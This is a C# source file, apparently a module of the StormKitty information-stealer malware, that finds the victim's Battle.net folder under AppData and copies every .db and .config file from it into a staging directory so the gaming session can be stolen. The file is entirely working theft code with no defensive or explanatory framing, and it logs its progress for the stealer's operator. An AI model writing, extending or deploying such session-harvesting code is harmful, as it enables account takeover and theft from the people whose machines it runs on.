using System;
using System.IO;

namespace Stealer
{
    internal sealed class BattleNET
    {
        private static string path = Path.Combine(
            Paths.appdata, "Battle.net");

        public static bool GetBattleNETSession(string sSavePath)
        {
            if (!Directory.Exists(path))
                return StormKitty.Logging.Log("BattleNET >> Session not found");

            try
            {
                Directory.CreateDirectory(sSavePath);

                foreach (string found in new string[2] { "*.db", "*.config" })
                {
                    string[] extracted = Directory.GetFiles(path, found, SearchOption.AllDirectories);

                    foreach (string file in extracted)
                    {
                        try
                        {
                            string todir;
                            FileInfo finfo = new FileInfo(file);
                            if (finfo.Directory.Name == "Battle.net")
                                todir = sSavePath;
                            else
                                todir = Path.Combine(sSavePath, finfo.Directory.Name);
                            // Create dir
                            if (!Directory.Exists(todir))
                                Directory.CreateDirectory(todir);
                            // Copy
                            finfo.CopyTo(Path.Combine(todir, finfo.Name));
                        }
                        catch (Exception ex) { return StormKitty.Logging.Log("BattleNET >> Failed copy file\n" + ex, false); }
                    }
                }

                Counter.BattleNET = true;
            } catch (Exception ex) { return StormKitty.Logging.Log("BattleNET >> Error\n" + ex, false); }
            return true;
        }

    }
}
